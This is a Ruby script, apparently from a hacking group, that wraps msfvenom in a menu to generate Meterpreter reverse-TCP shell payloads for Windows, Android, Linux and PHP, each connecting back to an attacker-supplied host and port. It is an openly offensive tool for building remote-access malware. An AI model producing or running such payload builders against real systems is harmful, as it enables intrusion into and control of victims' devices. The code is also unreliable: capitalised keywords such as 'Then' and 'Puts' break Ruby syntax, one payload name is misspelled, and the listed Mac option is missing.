#!usr/bin/env ruby
#xHunter_Mns Tunisian Fallaga team
require 'colorize'
  system"reset"
   
puts"     %%%         %%%%%%%     %%%%%%%%%    %%    %%   %%%%%%%    %%%%%%%%%  %%%%%%%%"
puts"    %%%         %%%%%%%     %%%%%%%%%    %%    %%   %%%%%%%    %%%%%%%%%  %%%%%%%%"
puts"   %%%         %%    %%          %%     %%    %%   %%    %%   %%         %%"
puts"  %%%         %%    %%         %%       %%%%%%    %%    %%   %%         %%"
puts" %%%         %% %% %%        %%          %%      %% %% %%   %%%%%%%%%  %%%%%%%%"
puts"%%%         %%    %%       %%           %%      %%    %%          %%        %%"
puts"%%%%%%%%%  %%    %%     %%%%%%%%       %%     %%    %%          %%        %%"
puts"%%%%%%%%% %%    %%    %%%%%%%%%       %%     %%    %%   %%%%%%%%%  %%%%%%%%"
puts""
puts""
puts""
puts""  
  



  puts"        easy Payload creator"
  puts""
  puts "1) windows x86 payload".green
  puts""
  puts "2) Android payload apk".green
  puts""
  puts "3) linux x86 payload".green
  puts""
  puts "4) PHP payload".green
  puts ""
  puts"5) Mac os payload".green
  puts""
puts""
  print"select your choice > "

 payload = gets.chomp 
 if payload == "1"
       then puts""
       puts"Set lHost : "
      lhost = gets.chomp
       #{lHost}
     
   puts"set lPort : "
   lport = gets.chomp
   system "msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe > shell.exe"
    puts "check the multixploit file you will find the payload there".red
    (system "reset") && (system "ruby run.rb") 
  elsif
Payload == "2"
Then 
puts "set lhost : "
lhost = gets.chomp
Puts "set lport :  "
lport = gets.chomp
 system "msfvenom -p android/meterpeter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f apk > shell.apk"
 puts "check the multixploit file you will find the payload there".red
 (system "reset") && (system "ruby run.rb")
elsif 
  Payload == "3"
Then 
puts "set lhost : "
puts""
lhost = gets.chomp
Puts "set lport : "
lport = gets.chomp
system " msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f elf > shell.elf"
puts "check the multixploit file you will find the payload there".red
(system "reset") && (system "ruby run.rb") 
elsif
Payload == "4"
Then 
puts "set lhost : "
puts""
lhost = gets.chomp
Puts "set lport : "
lport = gets.chomp
system "msfvenom -p php/meterpreter/reverse_tcp LHOST= #{lhost} LPORT= #{lport} -f php > shell.php"
puts "check the multixploit file you will find the payload there".red
(system "reset") && (system "ruby run.rb")
 if payload == "0"
  then system "ruby run.rb"
end
end
